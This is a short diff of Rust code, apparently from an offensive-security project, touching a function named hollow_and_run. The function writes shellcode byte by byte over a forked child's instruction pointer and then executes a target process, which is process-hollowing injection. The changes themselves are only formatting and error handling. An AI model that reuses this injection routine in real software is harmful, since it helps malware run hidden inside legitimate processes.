@@ -23,9 +23,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
 
             // Write the shellcode over where RIP used to point, one byte at a time
             for byte in shellcode {
-                if let Err(error) =
-                    write(child, point as *mut c_void, *byte as i64)
-                {
+                if let Err(error) = write(child, point as *mut c_void, *byte as i64) {
                     panic!("Unable to write portion of shellcode at {byte} to {target_process}: {error}");
                 }
                 point += 1;
@@ -46,7 +44,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             // Execute the target process in place of the currently running one (ie, the child)
             let executable = CString::new(target_process).unwrap();
             let arguments: &[&CStr; 0] = &[];
-            execv(&executable, arguments).unwrap();
+            // Returns an infallible, which can't be unwrapped or used really, but should be stored
+            let _ = execv(&executable, arguments);
         }
         Err(err) => panic!("Forking the parent failed: {err}"),
     }
